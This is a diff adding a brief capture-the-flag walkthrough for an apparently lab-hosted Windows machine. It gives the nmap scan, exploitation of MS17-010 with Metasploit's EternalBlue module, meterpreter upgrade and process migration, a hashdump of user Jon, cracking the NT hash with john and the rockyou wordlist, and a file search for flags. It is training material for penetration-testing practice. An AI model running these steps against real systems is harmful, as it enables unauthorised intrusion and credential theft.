@@ -1,0 +1,37 @@
+First lets scan the machine
+	sudo nmap -p- -Pn -A -O -vv -sS 10.10.243.201
+We find 4 ports open but only 3 under port number 1000
+Now what is this machine vulnerable to
+	ms17-010
+Lets gain access
+	open metasploit
+	search for ms17-010
+	we see the eternalblue exploit
+	show options
+	set RHOSTS
+	set LHOSTS (to your tunnel IP address)
+	run
+You should already be escalated, when I did this I was already NT/System
+But lets keep going through
+	background on shell and use the following
+		post/multi/manage/shell_to_meterpreter
+		show options
+		set session 1
+	This may not work because you may already be escalated as far as you can be
+	Migrate a system process
+		we did this before with Windows 7 to utilize the key logger
+		migrate xxxx (a PID number)
+			THIS ONLY WORKS ABOUT 25 PERCENT OF THE TIME AND IS UNSTABLE
+Now lets crack a password
+	hashdump
+		We can see that there is a user Jon
+		copy his name and also the end of the hash
+THERE ARE A 1000 DIFFERENT WAYS TO CRACK A HASH, I AM NOT GOING TO SHOW YOU AGAIN, TIME FOR YOU GUYS TO LEARN ON YOUR OWN
+	Here is a new one if you really need one john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt windowshash.txt
+	We cracked the password and we now have a way back in if we want
+	we can also RDP into if we wanted to
+Lets go back to the meterpreter session
+	type dir and realize there are lot of directories, there needs to be a better way to find the flags
+	There are a couple of ways to find the flags
+		search -f *flag*
+That is it, get your flags and you are done	
